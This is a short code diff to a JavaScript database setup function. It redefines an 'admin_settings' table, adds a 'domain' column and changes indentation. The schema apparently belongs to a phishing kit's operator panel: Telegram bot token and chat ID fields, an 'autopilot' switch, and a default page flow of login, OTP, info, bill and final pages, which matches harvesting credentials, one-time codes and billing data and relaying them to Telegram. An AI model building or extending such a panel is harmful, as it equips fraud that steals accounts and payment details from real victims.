@@ -39,23 +39,24 @@ export async function initDB() {
     `);
 
     await db.exec(`
-      CREATE TABLE IF NOT EXISTS admin_settings (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        autopilot INTEGER DEFAULT 0 CHECK (autopilot IN (0,1)),
-        userDisp TEXT,
-        BotToken TEXT,
-        ChatID TEXT,
-        TelegramEnabled INTEGER DEFAULT 0 CHECK (TelegramEnabled IN (0,1)),
-        baSUB INTEGER DEFAULT 0 CHECK (baSUB IN (0,1)),
-        pageFlow TEXT NOT NULL DEFAULT '{
-		  "1": { "page": "login", "enabled": true },
-		  "2": { "page": "otp", "enabled": true },
-		  "3": { "page": "info", "enabled": false },
-		  "4": { "page": "bill", "enabled": true },
-		  "5": { "page": "final", "enabled": true }
-		}'
-      );
-    `);
+	  CREATE TABLE IF NOT EXISTS admin_settings (
+	    id INTEGER PRIMARY KEY AUTOINCREMENT,
+	    autopilot INTEGER DEFAULT 0 CHECK (autopilot IN (0,1)),
+	    userDisp TEXT,
+	    BotToken TEXT,
+	    ChatID TEXT,
+	    TelegramEnabled INTEGER DEFAULT 0 CHECK (TelegramEnabled IN (0,1)),
+	    baSUB INTEGER DEFAULT 0 CHECK (baSUB IN (0,1)),
+	    domain TEXT DEFAULT '',
+	    pageFlow TEXT NOT NULL DEFAULT '{
+	      "1": { "page": "login", "enabled": true },
+	      "2": { "page": "otp", "enabled": true },
+	      "3": { "page": "info", "enabled": false },
+	      "4": { "page": "bill", "enabled": true },
+	      "5": { "page": "final", "enabled": true }
+	    }'
+	  );
+	`);
 
     await db.exec(`
       CREATE TABLE IF NOT EXISTS admins (
